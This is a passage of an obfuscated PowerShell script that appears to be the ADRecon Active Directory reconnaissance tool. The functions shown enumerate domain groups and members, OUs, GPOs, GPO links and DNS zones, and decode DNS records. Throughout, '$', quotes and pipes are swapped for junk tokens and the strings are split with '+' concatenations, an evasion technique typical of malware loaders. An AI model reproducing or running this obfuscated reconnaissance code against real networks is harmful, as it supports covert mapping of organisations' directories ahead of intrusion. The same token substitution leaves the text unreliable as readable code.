                5I7ELADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList (5I7ELDN)
                5I7ELADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(5I7ELADObject.objectSid[0], 0)
                5I7ELADObject.dispose()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRGroupMember'+'] Error retrieving Domain SID using the GlobalCatalog 5I7EL(5I7ELGlobalCatalog.IPAddress). Using SID from the ObjDomain.I2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                5I7ELADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(5I7ELobjDomain.objectSid[0], 0)
            }
        }

        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(objectClass=group)I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajsamaccountnameI2aj, I2ajobjectsidI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADGroups = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGroupMember] Error while enumerating Group Objects'+'I2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSea'+'rcher.dispose()

        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomai'+'n
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(Ok6rl(memberof=*)(primarygroupid=*))I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdistinguishednameI2aj, I2ajdnshostnameI2aj, I2ajobjectclassI2aj, I2ajprimarygroupidI2aj, I2ajmemberofI2aj, I2ajsamaccountnameI2aj, I2ajsamaccounttypeI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Tr'+'y
        {
            5I7ELADGroupMembers = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGroupMember] Error while enumerating GroupMember ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If ( (5I7ELADDomainSID) -and (5I7ELADGroups) -and (5I7ELADGroupMembers) )
        {
            Write-Verbose I2aj[*] Total GroupMember Objects: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADGroupMembers))I2aj
            5I7ELGroupMemberObj = [ADRecon.LDAPClass]::GroupMemberParser(5I7ELADGroups, 5I7ELADGroupMembers, 5I7ELADDomainSID, 5I7ELThreads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If (5I7ELGroupMemberObj)
    {
        Return 5I7ELGroupMemberObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADROU
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELfal'+'se)]
        [int] 5I7ELThreads = 10
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADOUs = @( Get-ADOrganizationalUnit -Filter * -Properties DistinguishedName,Description,Name,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning I2aj[Get-ADROU] Error while enumerating OU ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return'+' 5I7ELnull
        }

        If (5I7ELADOUs)
        {
            Write-Verbose I2aj[*] Total OUs: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADOUs))I2aj
            5I7ELOUObj = [ADRecon.ADWSClass]::OUParser(5I7ELADOUs, 5I7ELThreads)
            Remove-Variable ADOUs
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(objectclass=organizationalunit)I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdistinguishednameI2aj,I2ajdescriptionI2aj,I2ajnameI2aj,I2ajwhencreatedI2aj,I2ajwhenchangedI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

       '+' Try
        {
            5I7ELADOUs = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADROU] Error while enumerating OU ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADOUs)
        {
            Write-Verbose I2aj[*] Total OUs: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADOUs))I2aj
            5I7ELOUObj = [ADRecon.LDAPClass]::OUParser(5I7ELADOUs, 5I7ELThreads)
            Remove-Variable ADOUs
        }
    }

    If (5I7ELOUObj)
    {
        Return 5I7ELOUObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRGPO
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads = 10
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADGPOs = @( Get-ADObject -LDAPFilter JQTOy(objectCategory=groupPolicyContainer)JQTOy -Properties DisplayName,DistinguishedName,Name,gPCFileSysPath,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGPO] Error while enumerating groupPolicyContainer ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADGPOs)
        {
            Write-Verbose I2aj[*] Total GPOs: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADGPOs))I2aj
            5I7ELGPOsObj = [ADRecon.ADWSClass]::GPOParser(5I7ELADGPOs, 5I7ELThreads)
            Remove-Va'+'riable ADGPOs
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(objectCategory=groupPolicyContainer)I2aj
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADGPOs = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGPO] Error while enumerating groupPolicyContainer ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADGPOs)
        {
            Write-Verbose I2aj[*] Total GPOs: 5I7EL(['+'ADRecon.LDAPClass]::ObjectCount(5I7ELADGPOs))I2aj
            5I7ELGPOsObj = [ADRecon.LDAPClass]::GPOParser(5I7ELADGPOs, 5I7ELThreads)
            Remove-Variable ADGPOs
        }
    }

    If (5I7ELGPOsObj)
    {
        Return 5I7ELGPOsObj
    }
    Else
    {
        Return 5I7ELnull
    }
}


Function Get-ADRGPLink
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads = 10
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADSOMs = @( Get-ADObject -LDAPFilter JQTOy(Ok6rl(objectclass=domain)(objectclass=organizationalUnit))JQTOy -Properties DistinguishedName,Name,gPLink,gPOptions )
            5I7ELADSOMs += @( Get-ADObject -SearchBase I2ajCN=Sites,5I7EL((Get-ADRootDSE).configurationNamingContext)I2aj -LDAPFilter I2aj(objectclass=site)I2aj -Properties DistinguishedName,Name,gPLink,gPOptions )
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGPLink] Error while enumerating SOM ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        Try
        {
            5I7ELADGPOs = @( Get-ADObject -LDAPFilter JQTOy(objectCategory=groupPolicyContainer)JQTOy -Properties DisplayName,DistinguishedName )
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGPLink] Error while enumerating groupPolicyContainer ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If ( (5I7ELADSOMs) -and (5I7ELADGPOs) )
        {
            Write-Verbose I2aj[*] Total SOMs: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADSOMs))I2aj
            5I7ELSOMObj = [ADRecon.ADWSClass]::SOMParser(5I7ELADGPOs, 5I7ELADSOMs, 5I7ELThreads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELADSOMs = @()
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(Ok6rl(objectclass=domain)(objectclass=organizationalUnit))I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdistinguishednameI2aj,I2ajnameI2aj,I2ajgplinkI2aj,I2ajgpoptionsI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADSOMs += 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGPLink] Error while enumerating SOM ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        5I7ELSearchPath = I2ajCN=SitesI2aj
        If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7ELSearchPath,5I7EL(5I7ELobjDomainRootDSE.ConfigurationNamingContext)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
        }
        Else
        {
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7ELSearchPath,5I7EL(5I7ELobjDomainRootDSE.ConfigurationNamingContext)I2aj
        }
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
        5I7ELObjSearcher.Filter = I2aj(objectclass=site)I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdistinguishednameI2aj,I2ajnameI2aj,I2ajgplinkI2aj,I2ajgpoptionsI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADSOMs += 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGPLink] Error while enumerating SOM ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(objectCategory=groupPolicyContainer)I2aj
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADGPOs = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGPLink] Error while enumerating groupPolicyContainer ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If ( (5I7ELADSOMs) -and (5I7ELADGPOs) )
        {
            Write-Verbose I2aj[*] Total SOMs: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADSOMs))I2aj
            5I7ELSOMObj = [ADRecon.LDAPClass]::SOMParser(5I7ELADGPOs, 5I7ELADSOMs, 5I7ELThreads)
            Remove-Variable '+'ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If (5I7ELSOMObj)
    {
        Return 5I7ELSOMObj
    }
    Else
    {
        Return 5I7ELnull
    }
}


Function Convert-DNSRecord
{


    [OutputType(JQTOySystem.Management.Automation.PSCustomObjectJQTOy)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = 5I7ELTrue, ValueFromPipelineByPropertyName = 5I7ELTrue)]
        [Byte[]]
        5I7ELDNSRecord
    )

    BEGIN {
        Function Get-Name
        {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute(JQTOyPSUseOutputTypeCorrectlyJQTOy, JQTOyJQTOy)]
            [CmdletBinding()]
            Param(
                [Byte[]]
                5I7ELRaw
            )

            [Int]5I7ELLength = 5I7ELRaw[0]
            [Int]5I7ELSegments = 5I7ELRaw[1]
            [Int]5I7ELIndex =  2
            [String]5I7ELName  = JQTOyJQTOy

            while (5I7ELSegments-- -gt 0)
            {
                [Int]5I7ELSegmentLength = 5I7ELRaw[5I7ELIndex++]
                while (5I7ELSegmentLength-- -gt 0)
                {
                    5I7ELName += [Char]5I7ELRaw[5I7ELIndex++]
                }
                5I7ELName += I2aj.I2aj
            }
            5I7ELName
        }
    }

    PROCESS
    {
        
        5I7ELRDataType = [BitConverter]::ToUInt16(5I7ELDNSRecord, 2)
        5I7ELUpdatedAtSerial = [BitConverter]::ToUInt32(5I7ELDNSRecord, 8)

        5I7ELTTLRaw = 5I7ELDNSRecord[12..15]

        
        5I7ELNull = [array]::Reverse(5I7ELTTLRaw)
        5I7ELTTL = [BitConverter]::ToUInt32(5I7ELTTLRaw, 0)

        5I7ELAge = [BitConverter]::ToUInt32(5I7ELDNSRecord, 20)
        If (5I7ELAge -ne 0)
        {
            5I7ELTimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours(5I7ELage)).ToString()
        }
        Else
        {
            5I7ELTimeStam'+'p = JQTOy[static]JQTOy
        }

        5I7ELDNSRecordObject = New-Object PSObject

        switch (5I7ELRDataType)
        {
            1
            {
                5I7ELIP = I2aj{0}.{1}.{2}.{3}I2aj -f 5I7ELDNSRecord[24], 5I7ELDNSRecord[25], 5I7ELDNSRecord[26], 5I7ELDNSRecord[27]
                5I7ELData = 5I7ELIP
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOyAJQTOy
            }

            2
            {
                5I7ELNSName = Get-Name 5I7ELDNSRecord[24..5I7ELDNSRecord.length]
                5I7ELData = 5I7ELNSName
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOyNSJQTOy
            }

            5
            {
                5I7ELAlias = Get-Name 5I7ELDNSRecord[24..5I7ELDNSRecord.length]
                5I7ELData = 5I7ELAlias
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOyCNAMEJQTOy
            }

            6
            {
                5I7ELPrimaryNS = Get-Name 5I7ELDNSRecord[44..5I7ELDNSRecord.length]
                5I7ELResponsibleParty = Get-Name 5I7ELDNSRecord'+'[5I7EL(46+5I7ELDNSRecord[44])..5I7ELDNSRecord.length]
                5I7ELSerialRaw = 5I7ELDNSRecord[24..27]
                
                5I7ELNull = [array]::Reverse(5I7ELSerialRaw)
                5I7ELSerial = [BitConverter]::ToUInt32(5I7ELSerialRaw, 0)

    '+'            5I7ELRefreshRaw = 5I7ELDNSRecord[28..31]
                5I7ELNull = [array]::Reverse(5I7ELRefreshRaw)
                5I7ELRefresh = [BitConverter]::ToUInt32(5I7ELRefreshRaw, 0)

                5I7ELRetryRaw = 5I7ELDNSRecord[32..35]
                5I7ELNull = [array]::Reverse(5I7ELRetryRaw)
                5I7ELRetry = [BitConverter]::ToUInt32(5I7ELRetryRaw, 0)

                5I7ELExpiresRaw = 5I7ELDNSRecord[36..39]
                5I7ELNull = [array]::Reverse(5I7ELExpiresRaw)
                5I7ELExpires = [BitConverter]::ToUInt32(5I7ELExpiresRaw, 0)

                5I7ELMinTTLRaw = 5I7ELDNSRecord[40..43]
                5I7ELNull = [array]::Reverse(5I7ELMinTTLRaw)
                5I7ELMinTTL = [BitConverter]::ToUInt32(5I7ELMinTTLRaw, 0)

                5I7ELData = I2aj[I2aj + 5I7ELSerial + I2aj][I2aj + 5I7ELPrimaryNS + I2aj][I2aj + 5I7ELResponsibleParty + I2aj][I2aj + 5I7ELRefresh + I2aj][I2aj + 5I7ELRetry + I2aj][I2aj + 5I7ELExpires + I2aj][I2aj + 5I7ELMinTTL + I2aj]I2aj
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOySOAJQTOy
            }

            12
            {
                5I7ELPtr = Get-Name 5I7ELDNSRecord[24..5I7ELDNSRecord.length]
                5I7ELData = 5I7ELPtr
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOyPTRJQTOy
            }

            13
            {
                [string]5I7ELCPUType = I2ajI2aj
                [string]5I7ELOSType  = I2ajI2aj
                [int]5I7ELSegmentLength = 5I7ELDNSRecord[24]
                5I7ELIndex = 25
                while (5I7ELSegmentLength-- -gt 0)
                {
                    5I7ELCPUType += [char]5I7ELDNSRecord[5I7ELIndex++]
     '+'           }
                5I7ELIndex = 24 + 5I7ELDNSRecord[24] + 1
                [int]5I7ELSegmentLength = 5I7ELIndex++
                while (5I7ELSegmentLength-- -gt 0)
                {
                    5I7ELOSType += [char]5I7ELDNSRecord[5I7ELIndex++]
                }
                5I7ELData = I2aj[I2aj + 5I7ELCPUType + I2aj][I2aj + 5I7ELOSType + I2aj]I2aj
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOyHINFOJQTOy
            }

            15
            {
                5I7ELPriorityRaw = 5I7ELDNSRecord[24..25]
                
                5I7ELNull = [array]::Reverse(5I7ELPriorityRaw)
                5I7ELPriority = [BitConverter]::ToUInt16(5I7ELPriorityRaw, 0)
                5I7ELMXHost '+'  = Get-Name 5I7ELDNSRecord[26..5I7ELDNSRecord.length]
                5I7ELData = I2aj[I2aj + 5I7ELPriority + I2aj][I2aj + 5I7ELMXHost + I2aj]I2aj
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOyMXJQTOy
            }

            16
            {
                [string]5I7ELTXT  = JQTOyJQTOy
                [int]5I7ELSegmentLength = 5I7ELDNSRecord[24]
                5I7ELIndex = 25
                while (5I7ELSegmentLength-- -gt 0)
                {
                    5I7ELTXT += [char]5I7ELDNSRecord[5I7ELIndex++]
                }
                5I7ELData = 5I7ELTXT
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOyTXTJQTOy
            }

            28
            {
        		
                5I7ELAAAA = I2ajI2aj
                for (5I7ELi = 24; 5I7ELi -lt 40; 5I7ELi+=2)
                {
                    5I7ELBlockRaw = 5I7ELDNSRecord[5I7ELi..5I7EL(5I7ELi+1)]
                    
                    5I7ELNull = [array]::Reverse(5I7ELBlockRaw)
                    5I7ELBlock = [BitConverter]::ToUInt16(5I7ELBlockRaw, 0)
			        5I7ELAAAA += (5I7ELBlock).ToString(JQTOyx4JQTOy)
			        If (5I7ELi -ne 38)
                    {
                        5I7ELAAAA += JQTOy:JQTOy
                    }
                }
                5I7ELData = 5I7ELAAAA
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOyAAAAJQTOy
            }

            33
            {
                5I7ELPriorityRaw = 5I7ELDNSRecord[24..25]
                
                5I7ELNull = [array]::Reverse(5I7ELPriorityRaw)
                5I7ELPriority = [BitConverter]::ToUInt16(5I7ELPriorityRaw, 0)

                5I7ELWeightRaw = 5I7ELDNSRecord[26..27]
                5I7ELNull = [array]::Reverse(5I7ELWeightRaw)
                5I7ELWeight = [BitConverter]::ToUInt16(5I7ELWeightRaw, 0)

                5I7ELPortRaw = 5I7ELDNSRecord[28..29]
                5I7ELNull = [array]::Reverse(5I7ELPortRaw)
                5I7ELPort = [BitConverter]::ToUInt16(5I7ELPortRaw, 0)

                5I7ELSRVHost = Get-Name 5I7ELDNSRecord[30..5I7ELDNSRecord.length]
                5I7ELData = I2aj[I2aj + 5I7ELPriority + I2aj][I2aj + 5I7ELWeight + I2aj][I2aj + 5I7ELPort + I2aj][I2aj + 5I7ELSRVHost + I2aj]I2aj
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOySRVJQTOy
            }

            default
            {
                5I7ELData = 5I7EL([System.Convert]::ToBase64String(5I7ELDNSRecord[24..5I7ELDNSRecord.length]))
                5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyRecordTypeJQTOy JQTOyUNKNOWNJQTOy
            }
        }
        5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyUpdatedAtSerialJQTOy 5I7ELUpdatedAtSerial
        5'+'I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyTTLJQTOy 5I7ELTTL
        5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyAgeJQTOy 5I7ELAge
        5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyTimeStampJQTOy 5I7ELTimeStamp
        5I7ELDNSRecordObject Ok6rl Add-Member Noteproperty JQTOyDataJQTOy 5I7ELData
        Return 5I7ELDNSRecordObject
    }
}

Function Get-ADRDNSZone
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELDomainController,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELADROutputDir,

        [Parameter(Mandatory = 5I7ELtrue)]
        [a'+'rray] 5I7ELOutputType,

        [Parameter(Mandatory = 5I7ELfalse)]
        [bool] 5I7ELADRDNSZones = 5I7ELtrue,

        [Parameter(Mandatory = 5I7ELfalse)]
        [bool] 5I7ELADRDNSRecords = 5I7ELfalse
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADDNSZones = Get-ADObject -LDAPFilter JQTOy(objectClass=dnsZone)JQTOy -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRDNSZone] Error while enumerating dnsZone Ob'+'jectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }

        5I7ELDNSZoneArray = @()
        If (5I7ELADDNSZones)
        {
            5I7ELDNSZoneArray += 5I7ELADDNSZones
            Remove-Variable ADDNSZones
        }

        Try
        {
            5I7ELADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRDNSZone] Error getting Domain ContextI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        Try
        {
            5I7ELADDNSZones1 = Get-ADObject -LDAPFilter JQTOy(objectClass=dnsZone)JQTOy -SearchBase I2ajDC=DomainDnsZones,5I7EL(5I7ELADDomain.DistinguishedName)I2aj -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
  '+'      Catch
        {
            Write-Warning I2aj[Get-ADRDNSZone] Error while enumerating DC=DomainDnsZones,5I7EL(5I7ELADDomain.DistinguishedName) dnsZone ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Mess'+'age)I2aj
        }
        If (5I7ELADDNSZones1)
        {
            5I7ELDNSZoneArray += 5I7ELADDNSZones1
            Remove-Variable ADDNSZones1
        }

        Try
        {
            5I7ELADDNSZones2 = Get-ADObject -LDAPFilter JQTOy(objectCl'+'ass=dnsZone)JQTOy -SearchBase I2ajDC=ForestDnsZones,DC=5I7EL(5I7ELADDomain.Forest -replace JQTOyCOlhg.JQTOy,JQTOy,DC=JQTOy)I2aj -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRDNSZone] Error while enumerating DC=ForestDnsZones,DC=5I7EL(5I7ELADDomain.Forest -replace JQTOyCOlhg.JQTOy,JQTOy,DC=JQTOy) dnsZone ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }
        If (5I7ELADDNSZones2)
        {
            5I7ELDNSZoneArray += 5I7ELADDNSZones2
            Remove-Variable ADDNSZones2
        }

        If (5I7ELADDomain)
        {
            Remove-Variable ADDomain
        }

        Write-Verbose I2aj[*] Total DNS Zones: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELDNSZoneArray))I2aj

        If (5I7ELDNSZoneArray)
        {
            5I7ELADDNSZonesObj = @()
            5I7ELADDNSNodesObj = @()
            5I7ELDNSZoneArray Ok6rl ForEach-Object {
                
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name Name -Value 5I7EL([ADRecon.ADWSClass]::CleanString(5I7EL_.Name))
                Try
                {
                    5I7ELDNSNodes = Get-ADObject -SearchBase 5I7EL(5I7EL_.DistinguishedName) -LDAPFilter JQTOy(objectClass=dnsNode)JQTOy -Properties DistinguishedName,dnsrecord,dNSTombstoned,Name,ProtectedFromAccidentalDeletion,showInAdvancedViewOnly,whenChanged,whenCreated
                }
                Catch
                {
                    Write-Warning I2aj[Get-ADRDNSZone] Error while enumerating 5I7EL(5I7EL_.DistinguishedName) dnsNode ObjectsI2aj
                    Writ'+'e-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                }
                If (5I7ELDNSNodes)
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name RecordCount -Value 5I7EL(5I7ELDNSNodes Ok6rl Measure-Object Ok6rl Select-Object -ExpandProperty Count)
                    5I7ELDNSNodes Ok6rl ForEach-Object {
                        5I7ELObjNode = New-Object PSObject
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name ZoneName -Value 5I7ELObj.Name
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name Name -Value 5I7EL_.Name
                        Try
                        {
                            5I7ELDNSRecord = Convert-DNSRecord 5I7EL_.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning I2aj[Get-ADRDNSZone] Error while converting the DNSRecordI2aj
                            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                        }
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name RecordType -Value 5I7ELDNSRecord.RecordType
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name Data -Value 5I7ELDNSRecord.Data
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name TTL -Value 5I7ELDNSRecord.TTL
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name Age -Value 5I7ELDNSRecord.Age
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name TimeStamp -Value 5I7ELDNSRecord.TimeStamp
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value 5I7ELDNSRecord.UpdatedAtSerial
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name whenCreated -Value 5I7EL_.whenCreated
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name whenChanged -Value 5I7EL_.whenChanged
                        
                        
                        
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value 5I7EL_.showInAdvancedViewOnly
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name DistinguishedName -Value 5I7EL_.DistinguishedName
                        5I7ELADDNSNodesObj += 5I7ELObjNode
                        If (5I7ELDNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name RecordCount -Value 5I7ELnull
                }
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name USNCreated -Value 5I7EL_.usncreated
